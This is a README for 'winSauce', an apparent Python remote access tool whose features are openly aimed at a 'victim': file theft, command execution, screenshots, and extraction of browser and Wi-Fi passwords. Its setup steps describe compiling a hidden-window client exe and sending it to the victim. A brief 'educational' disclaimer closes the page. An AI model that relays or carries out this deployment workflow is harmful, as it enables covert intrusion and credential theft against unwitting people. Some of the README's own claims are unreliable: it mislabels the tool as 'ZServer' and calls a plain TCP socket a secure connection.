# winSauce: A Remote Client Management Tool

## Overview

winSauce is a Python-based tool designed for remote client management. It allows you to control and interact with a connected client through a simple command-line interface. winSauce empowers you to:

- ## List files on the victim machine.
- ## Download files from the victim.
- ## Execute commands on the victim.
- ## Capture screenshots of the victim's cmputer.
- ## Extract passwords from popular browsers like Chrome, Edge, and Brave.
- ## Retrieve saved Wi-Fi passwords from the victim.

## Getting Started

1. Clone the Repository:
   git clone https://github.com/VoidCygnus/winSauce.git
2. Install Dependencies:
   pip install -r requirements.txt
3. Change SERVER_IP on client.py
   nano client.py
   Replace SERVER_IP: In the client.py script, replace '127.0.0.1' with the actual IP address of your server.
4. Run pyinstaller to create exe file for your updated script.
   pyinstaller --onefile --windowed client.py    //make sure that you give correct path to your client.py file
5. Now send this exe file to your victim, and run server.py at your computer
   python3 server.py
6. Execute the commands based on the options listed on the screen.
7. Sometimes command may not work at one time, you may have to repeat that option for second time to get the correct output.

Features
Secure Connection: ZServer uses a simple TCP socket connection for communication.
Cross-Platform: The client script is compatible with Windows, and the server can be run on any platform with Python installed.
User-Friendly Interface: The command-line interface is easy to understand and use.
Multiple Clients: ZServer can handle connections from multiple clients simultaneously.

Disclaimer
This tool is for educational and learning purposes only. It is not intended for malicious activities. Using this tool for illegal purposes is strictly prohibited.

Contributions to this project are welcome! Please submit pull requests with clear descriptions of your changes.
Author
Void Cygnus
